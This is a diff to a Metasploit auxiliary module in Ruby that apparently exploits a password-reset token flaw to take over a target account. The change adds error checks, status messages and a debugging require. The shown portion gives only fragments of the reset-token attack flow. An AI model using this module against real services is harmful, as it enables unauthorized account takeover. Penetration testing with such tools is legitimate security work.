@@ -7,6 +7,7 @@
 
 require 'msf/core'
 require 'rexml/element'
+require 'pry'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -67,6 +68,15 @@ class Metasploit3 < Msf::Auxiliary
 					'method'  => 'POST',
 					'data'    => postdata,
 				})
+
+		if res.code == 200
+			error_text = res.body[/<div id=\"error_explanation\">\n\s+(.*?)<\/div>/m, 1]
+			print_error("Server returned an error:")
+			print_error(error_text)
+			return false
+		end
+		return true
+		#binding.pry
 	end
 
 	def clear_tokens()
@@ -100,8 +110,6 @@ class Metasploit3 < Msf::Auxiliary
 					'data'    => xml,
 				})
 
-			#binding.pry if report
-
 			case res.code
 			when 200
 				# Failure, grab the error text
@@ -132,7 +140,12 @@ class Metasploit3 < Msf::Auxiliary
 		clear_tokens() if datastore['FLUSHTOKENS']
 
 		# Generate a token for our account
-		generate_token(datastore['TARGETEMAIL'])
+		status = generate_token(datastore['TARGETEMAIL'])
+		if status == false
+			print_error("Failed")
+			return
+		end		 
+		print_good("Success")
 
 		# Reset a password.  We're racing users creating other reset tokens.
 		# If we didn't flush, we'll reset the account with the lowest ID that has a token.
